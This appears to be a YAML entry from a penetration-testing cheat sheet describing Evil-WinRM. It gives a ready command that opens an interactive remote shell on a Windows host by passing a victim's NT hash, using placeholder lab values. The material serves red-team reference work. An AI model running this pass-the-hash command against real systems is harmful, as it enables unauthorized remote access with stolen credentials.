---
description: |
  Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Evil-WinRM supports passing the victim's NT hash for authorization.

  Command Reference:

  	Target IP: 10.10.10.1

  	Username: john

  	NT Hash: c23b2e293fa0d312de6f59fd6d58eae3


command: |
  evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
items:
  - Username
  - Hash
services:
  - WMI
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/Hackplayers/evil-winrm
---
